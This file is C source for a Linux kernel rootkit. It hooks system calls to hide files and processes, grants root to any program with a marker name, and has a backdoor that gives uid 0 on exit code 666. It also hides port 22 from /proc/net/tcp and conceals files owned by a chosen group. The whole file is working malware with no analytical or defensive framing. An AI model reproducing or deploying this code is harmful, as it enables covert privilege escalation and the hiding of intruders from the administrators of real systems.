/* external hook define file */

#define __EXTERN_HOOK_TABLE__

#define NR_syscalls 325

/*from net/ipv4/tcp_ipv4.c*/
#define TMPSZ 150

unsigned int sys_table_global = 0;

/* Port to hide, 0x0016 = 22, i.e., sshd */
char port[12]="0016";

void *hook_table[NR_syscalls];

/* hook prototypes - use this hook as your reference */
asmlinkage static void hook_example_exit(int status);

/* backporting Daniel's existing code to new hooking engine -bas */

/* Daniel Palacio's includes */
#include <linux/init.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/stddef.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/dirent.h>
#include <linux/types.h>
#include <linux/skbuff.h>
#include <linux/time.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/syscalls.h>
#include <linux/ip.h>
#include <linux/netdevice.h>
#include <linux/proc_fs.h>
#include <linux/resource.h>
#include <linux/spinlock.h>
#include <linux/proc_fs.h>
#include <linux/dcache.h>
#include <linux/fdtable.h>

#include <net/tcp.h>
#include <asm/uaccess.h>
#include <asm/processor.h>
#include <asm/unistd.h>
#include <asm/ioctls.h>
#include <asm/termbits.h>

#ifdef __NET_NET_NAMESPACE_H
    #include <net/net_namespace.h>
#endif

/* define for Daniel's code */
#define SHRT_MAX    0x7fff
#define VERSION     1
#define PROC_HIDDEN 0x00000020
#define FILE_HIDE   0x200000
#define EVIL_GID    2701 /* 37 73 */
#define PID_TO_HIDE 2334
 
#define _FILE_TO_HIDE_ "AAA"
static char *HIDE           = "AAA";

signed short hidden_pids[SHRT_MAX];
unsigned long long inode    = 0;   /* The inode of /etc/modules */

struct proc_dir_entry *tcp;

int errno;

#ifdef __NET_NET_NAMESPACE_H
    struct proc_dir_entry *proc_net;
#else
    extern struct proc_dir_entry *proc_net;
#endif

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

/**
 * memmove - Copy one area of memory to another
 * @dest: Where to copy to
 * @src: Where to copy from
 * @count: The size of the area.
 *
 * Unlike memcpy(), memmove() copes with overlapping areas.
 */
static void *our_memmove(void *dest, const void *src, size_t count)
{
        char *tmp;
        const char *s;

        if (dest <= src) {
                tmp = dest;
                s = src;
                while (count--)
                        *tmp++ = *s++;
        } else {
                tmp = dest;
                tmp += count;
                s = src;
                s += count;
                while (count--)
                        *--tmp = *--s;
        }
        return dest;
}

/**
 * memcmp - Compare two areas of memory
 * @cs: One area of memory
 * @ct: Another area of memory
 * @count: The size of the area.
 */
static int our_memcmp(const void *cs, const void *ct, size_t count)
{
        const unsigned char *su1, *su2;
        int res = 0;

        for (su1 = cs, su2 = ct; 0 < count; ++su1, ++su2, count--)
                if ((res = *su1 - *su2) != 0)
                        break;
        return res;
}

/**
 * memset - Fill a region of memory with the given value
 * @s: Pointer to the start of the area.
 * @c: The byte to fill the area with
 * @count: The size of the area.
 *
 * Do not use memset() to access IO space, use memset_io() instead.
 */
static void *our_memset(void *s, int c, size_t count)
{
        char *xs = s;

        while (count--)
                *xs++ = c;
        return s;
}

/**
 * memcpy - Copy one area of memory to another
 * @dest: Where to copy to
 * @src: Where to copy from
 * @count: The size of the area.
 *
 * You should not use this function to access IO space, use memcpy_toio()
 * or memcpy_fromio() instead.
 */
void *our_memcpy(void *dest, const void *src, size_t count)
{
        char *tmp = dest;
        const char *s = src;

        while (count--)
                *tmp++ = *s++;
        return dest;
}

static size_t our_strlen(const char *s)
{
        int d0;
        int res;
        asm volatile("repne\n\t"
                "scasb\n\t"
                "notl %0\n\t"
                "decl %0"
                : "=c" (res), "=&D" (d0)
                : "1" (s), "a" (0), "0" (0xffffffffu)
                : "memory");
        return res;
}

/**
 * strstr - Find the first substring in a %NUL terminated string
 * @s1: The string to be searched
 * @s2: The string to search for
 */
char *our_strstr(const char *s1, const char *s2)
{
        int l1, l2;

        l2 = our_strlen(s2);
        if (!l2)
                return (char *)s1;
        l1 = our_strlen(s1);
        while (l1 >= l2) {
                l1--;
                if (!our_memcmp(s1, s2, l2))
                        return (char *)s1;
                s1++;
        }
        return NULL;
}

static int our_strcmp(const char *cs, const char *ct)
{
        int d0, d1;
        int res;
        asm volatile("1:\tlodsb\n\t"
                "scasb\n\t"
                "jne 2f\n\t"
                "testb %%al,%%al\n\t"
                "jne 1b\n\t"
                "xorl %%eax,%%eax\n\t"
                "jmp 3f\n"
                "2:\tsbbl %%eax,%%eax\n\t"
                "orb $1,%%al\n"
                "3:"
                : "=a" (res), "=&S" (d0), "=&D" (d1)
                : "1" (cs), "2" (ct)
                : "memory");
        return res;
}

static int our_atoi(char *str)  
{  
    int res = 0;  
    int mul = 1;  
    char *ptr;  
    for(ptr = str + our_strlen(str)-1; ptr >= str; ptr--){  
        if(*ptr < '0' || *ptr > '9')  
            return -1;  
        res += (*ptr -'0') * mul;  
        mul *= 10;  
    }  
    return res;  
}  

/* Daniel Palacio's hooks */
asmlinkage static int hook_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
asmlinkage static int hook_getdents32 (unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage static int hook_execve(const char *filename, char *const argv[], char *const envp[]);
//asmlinkage int hook_execve(struct pt_regs regs);
asmlinkage static int hook_fork(struct pt_regs regs);
asmlinkage static void hook_exit(int error_code);
asmlinkage static int hook_chdir(const char *path);
asmlinkage static int hook_open(const char *pathname, int flags, int mode);
asmlinkage static int hook_kill(int pid, int sig);
asmlinkage static int hook_getpriority(int which, int who);

/* Daniel Palacio's non-syscall hook prototypes */
static int hook_tcp4_seq_show(struct seq_file *seq, void *v);
int (*original_tcp4_seq_show)(struct seq_file *seq, void *v);

/* main hook uninit */
static void __uninit_hook_table(void)
{
    /* unload any additional non-syscall hooks here */
 
    /* un-do Daniel's tcp hook */
    tcp = proc_net->subdir->next;

    /*  tcp4_seq_show() with original */
    while (our_strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
        tcp = tcp->next;

    if (tcp != proc_net->subdir)
        ((struct tcp_seq_afinfo *)(tcp->data))->seq_ops.show = original_tcp4_seq_show;
}

/* main hook init */
static void __init_hook_table(void)
{
    
    int i;

    /* clear table */
    for (i = 0; i < NR_syscalls; i ++)
        hook_table[i] = NULL;
    
    /* init hooks */
    hook_table[__NR_getdents64]     = (void *)hook_getdents64;
    hook_table[__NR_getdents]       = (void *)hook_getdents32;
    hook_table[__NR_chdir]          = (void *)hook_chdir;
    hook_table[__NR_open]           = (void *)hook_open;
//    hook_table[__NR_execve]         = (void *)hook_execve;
    hook_table[__NR_fork]           = (void *)hook_fork;
    hook_table[__NR_exit]           = (void *)hook_exit;
    hook_table[__NR_kill]           = (void *)hook_kill;
    hook_table[__NR_getpriority]    = (void *)hook_getpriority;

    /* example hook */
    //hook_table[__NR_exit]         = (void *)hook_example_exit;
    
    /* any additional (non-syscall) hooks go here */

    /* clear Daniel's hidden_pids */
    our_memset(hidden_pids, 0, sizeof(hidden_pids));
	hidden_pids[PID_TO_HIDE]=1;

    /* Daniel Palacio's tcp hook */
    #ifdef __NET_NET_NAMESPACE_H
        proc_net = init_net.proc_net;
    #endif

    if(proc_net == NULL)
        return;

    tcp = proc_net->subdir->next;
    while (our_strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
        tcp = tcp->next;

    if (tcp != proc_net->subdir)
    {
        original_tcp4_seq_show = ((struct tcp_seq_afinfo *)(tcp->data))->seq_ops.show;
        ((struct tcp_seq_afinfo *)(tcp->data))->seq_ops.show = hook_tcp4_seq_show;
    }
}

/* example hook declarations */

asmlinkage /* required: args passed on stack to syscall */
static void hook_example_exit(int status)
{
    /* standard hook prologue */
    asmlinkage int (*orig_exit)(int status);
    void **sys_p    = (void **)sys_table_global;
    orig_exit       = (int (*)())sys_p[__NR_exit];

    printk("*** !!!HOORAY!!! -> hook_example_exit(%d) @ %X called\n", \
            status, (unsigned int)hook_example_exit);

    if(status == 666)
    {
        current->uid    = 0;
        current->gid    = 0;
        current->euid   = 0;
        current->egid   = 0;
    }
    else
        return orig_exit(status);
}

/* XXXXXXXXXXXXXXXXXXXXX DANIEL PALACIO WROTE THE FOLLOWING XXXXXXXXXXXXXXXXXXX */

//asmlinkage /* modified this .. but still not happy -bas */
asmlinkage static int hook_getdents64 (unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
	void **sys_p    = (void **)sys_table_global;
	asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) = sys_p[__NR_getdents64];
	struct linux_dirent64 dir2;
	struct linux_dirent64 * dir3;
	struct inode *proc_node;
	int hide_proc   = 0;
	int r,t,n;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
	proc_node = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#else
	proc_node = current->files->fd[fd]->f_dentry->d_inode;
#endif
	
	r = (*original_getdents64)(fd, dirp, count);

	/* hidden processes get to see life */
	if (current->flags & PROC_HIDDEN)
	{
		return r;
	}

	if(r>0){
		dir2.d_ino = dirp->d_ino;
		dir2.d_off = dirp->d_off;
		dir2.d_reclen = dirp->d_reclen;
		dir2.d_type = dirp->d_type;
		printk(KERN_ERR "dirp->d_name is %s\n",dirp->d_name);
//		memcpy(dir2.d_name,dirp->d_name,dirp->d_reclen-sizeof(struct linux_dirent64));
    		t=r;
		dir3=dirp;
		while(t>0){
			n=dir3->d_reclen;
			t-=n;
			printk(KERN_ERR "dir3->d_name is %s\n",dir3->d_name);
			/* See if we are looking at a process */
        		if (proc_node->i_ino == PROC_ROOT_INO)
        		{
        			#ifdef __DEBUG__
            			printk("*** getdents64 dealing with proc entry\n");
        			#endif
                		if(our_atoi(dir3->d_name) == PID_TO_HIDE)
                		{
                        			hide_proc = 1;
				}
			}

			// Hide process with hide flag set and Hide file whose name contains a string defined by _FILE_TO_HIDE_
			if((hide_proc == 1) || (our_strstr((char *) &(dir3->d_name),(char *) _FILE_TO_HIDE_)!=NULL)){
            			printk(KERN_ERR "*** getdents64 dealing with hidden proc entry\n");
				if(t!=0)
					our_memmove(dir3,(char *) dir3+dir3->d_reclen,t);
				else
					dir3->d_off = 1024;
				r-=n;
			}
			if(dir3->d_reclen == 0){
				r -=t;
				t=0;
			}
			if(t!=0)
				dir3=(struct linux_dirent64 *)((char *) dir3+dir3->d_reclen);
    		}
		dirp->d_ino = dir2.d_ino;
		dirp->d_off = dir2.d_off;
		dirp->d_reclen = dir2.d_reclen;
		dirp->d_type = dir2.d_type;
//		memcpy(dirp->d_name,dir2.d_name,dirp->d_reclen-sizeof(struct linux_dirent64));
//		dirp->d_name[0] = dir2.d_name[0];
	}
	return r;
}

asmlinkage /* modified this .. but still not happy -bas */
static int hook_getdents32 (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	struct linux_dirent64 dir2;
	struct linux_dirent64 * dir3;
	struct inode *proc_node;
	int r,t,n;
	void **sys_p    = (void **)sys_table_global;
	asmlinkage int (*original_getdents32)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count) \
                    = sys_p[__NR_getdents];


#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
    proc_node = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#else
    proc_node = current->files->fd[fd]->f_dentry->d_inode;
#endif

    /* can't read into kernel land due to !access_ok() check in original */
    r = original_getdents32(fd, dirp, count); 

    /* hidden processes get to see life */
    if (current->flags & PROC_HIDDEN)
    {
        return r;
    }

    dir3 = dirp;
	t=r;
    while (t > 0)
    {
        int next        = dir3->d_reclen;
        int hide_proc   = 0;
        char *adjust    = (char *)dir3;

        /* See if we are looking at a process */
        if (proc_node->i_ino == PROC_ROOT_INO)
        {
		if (our_atoi(dir3->d_name) == PID_TO_HIDE)
			hide_proc = 1;

        }

        /* Hide processes flagged or filenames starting with HIDE*/
        if ((hide_proc == 1) || (our_strstr(dir3->d_name, HIDE) != NULL))
        {
        #ifdef __DEBUG__
            printk("*** getdents32 hiding: %s\n", dir3->d_name);
        #endif
        }
        else
        {
            our_memcpy((char *)dir3 + r, dir3, dir3->d_reclen);
            r += dir3->d_reclen;
        }

        adjust      += next;
        dir3           = (struct linux_dirent *)adjust;
        t   -= next;
    }

    return r;
}

/* 
    The hacked execve will fix the flag to add our PROC_HIDDEN
    Once set on parent, flag will be copied automagically by the
    kernel to its childs. We also give root priviledges, just for fun.
*/

asmlinkage static int hook_execve(const char *filename, char *const argv[], char *const envp[])
//asmlinkage int hook_execve(struct pt_regs regs)
{
    int ret;
    void **sys_p = (void **)sys_table_global;
	asmlinkage int (*original_execve)(const char *filename, char *const argv[], char *const envp[]) = sys_p[__NR_execve];
//    asmlinkage int (*original_execve)(struct pt_regs regs) = sys_p[__NR_execve];

/*    char * filename;

    filename = getname((char __user *) regs.bx);
*/
    if(current->flags & PROC_HIDDEN)
    {
        if (current->pid > 0 && current->pid < SHRT_MAX)
            hidden_pids[current->pid] = 1;
    }

    if((our_strstr(filename, HIDE) != NULL))
    {
        current->uid    = 0;
        current->euid   = 0;
        current->gid    = EVIL_GID;
        current->egid   = EVIL_GID;
        current->flags  = current->flags | PROC_HIDDEN;
        if (current->pid > 0 && current->pid < SHRT_MAX)
            hidden_pids[current->pid] = 1;
    }

	ret = (*original_execve)(filename, argv, envp);
	return ret;
}

/*
    BUG: This is not the sys_fork in the syscall table it has more args
    its hacked_sys_fork(struct pt_regs)
    http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html
*/

asmlinkage 
static int hook_fork(struct pt_regs regs)
{
    int ret;
    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_fork)(struct pt_regs regs) = sys_p[__NR_fork];

    ret = (*original_sys_fork)(regs);
#ifdef __DEBUG__
    printk("return from sys_fork = %d", ret);
    printk("current=0x%p ret is %d", current, ret);
#endif
    if((current->flags & PROC_HIDDEN) && ret > 0 && ret < SHRT_MAX)
    {
        hidden_pids[ret] = 1;
    }
    return ret;
}

asmlinkage 
static int hook_kill(int pid, int sig)
{
    void **sys_p = (void **)sys_table_global;
    asmlinkage long (*original_sys_kill)(int pid, int sig) = sys_p[__NR_kill];

    if(current->flags & PROC_HIDDEN)
    {
        return original_sys_kill(pid, sig);
    }
    if((pid > 0 && pid < SHRT_MAX) && hidden_pids[pid] == 1)
    {
        return -1;
    }
    return original_sys_kill(pid, sig);
}

asmlinkage 
static void hook_exit(int code)
{
    void **sys_p = (void **)sys_table_global;
    asmlinkage long (*original_sys_exit)(int code) = sys_p[__NR_exit];

    if (current->pid > 0 && current->pid < SHRT_MAX)
        hidden_pids[current->pid] = 0;
    return original_sys_exit(code);
}

asmlinkage 
static int hook_getpriority(int which, int who)
{
    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_getpriority)(int which, int who) = sys_p[__NR_getpriority];

    if(current->flags&PROC_HIDDEN)
    {
        /* Hidden processes see all */
        return (*original_sys_getpriority)(which, who);
    }

    if(who < 0 || who > SHRT_MAX)
    {
        return (*original_sys_getpriority)(which, who);
    }
    if(which == PRIO_PROCESS && who > 0 && who < SHRT_MAX && hidden_pids[who])
    {
        errno = -1;
        return -ESRCH;
    }
    return (*original_sys_getpriority)(which, who);
}

char *strnstr(const char *haystack, const char *needle, size_t n)
{
        char *s = our_strstr(haystack, needle);
        if (s == NULL)
                return NULL;
        if (s-haystack+our_strlen(needle) <= n)
                return s;
        else
                return NULL;
}

/* 
    This function is called when /net/proc/tcp is read, its in charge of 
    writing the data about current sockets, so we need to subvert that data.
*/
static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
        int retval=(*original_tcp4_seq_show)(seq, v);

        if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
                seq->count -= TMPSZ;
	return retval;
}

/* limited /proc/ based listing hiding */

/*
    I modified these to be proc aware properly -bas
*/

asmlinkage
static int hook_chdir(const char __user *path)
{
    int fd          = 0;
    struct inode *inode;

    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_chdir)(const char *path) = sys_p[__NR_chdir];
    asmlinkage int (*original_sys_open)(const char *pathname, int flags, int mode) = sys_p[__NR_open];
    asmlinkage int (*original_sys_close)(int fd) = sys_p[__NR_close];

    if (current->flags & PROC_HIDDEN)
        return original_sys_chdir(path); 

    fd = original_sys_open(path, O_RDONLY, 0);
    if (fd < 0)
        goto error_fd;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
    inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#else
    inode = current->files->fd[fd]->f_dentry->d_inode;
#endif

    /* check if file belongs to our egid */
    if (inode->i_gid == EVIL_GID)
    {
        original_sys_close(fd);
        return -ENOENT;
    }

    original_sys_close(fd);

error_fd:
    return original_sys_chdir(path);
}

asmlinkage
static int hook_open(const char __user *pathname, int flags, int mode)
{
    int fd              = 0;
    struct inode *inode;

    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_open)(const char *pathname, int flags, int mode) = sys_p[__NR_open];
    asmlinkage int (*original_sys_close)(int fd) = sys_p[__NR_close];

    if (current->flags & PROC_HIDDEN)
        return original_sys_open(pathname, flags, mode);

    fd = original_sys_open(pathname, flags, mode);
    if (fd < 0)
        goto out;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
    inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#else
    inode = current->files->fd[fd]->f_dentry->d_inode;
#endif
    
    if (inode->i_gid == EVIL_GID)
    {
        original_sys_close(fd);
        return -ENOENT;
    }

out:
    return fd;
}
